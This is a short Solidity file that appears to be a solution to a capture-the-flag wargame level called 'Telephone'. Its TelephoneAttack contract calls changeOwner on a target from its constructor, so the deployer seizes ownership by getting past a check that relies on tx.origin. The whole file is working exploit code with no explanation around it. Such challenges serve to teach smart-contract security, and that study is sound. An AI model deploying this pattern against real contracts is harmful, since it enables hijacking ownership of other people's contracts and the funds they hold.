// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    constructor(address _target){
        Telephone(_target).changeOwner(msg.sender);
    }
}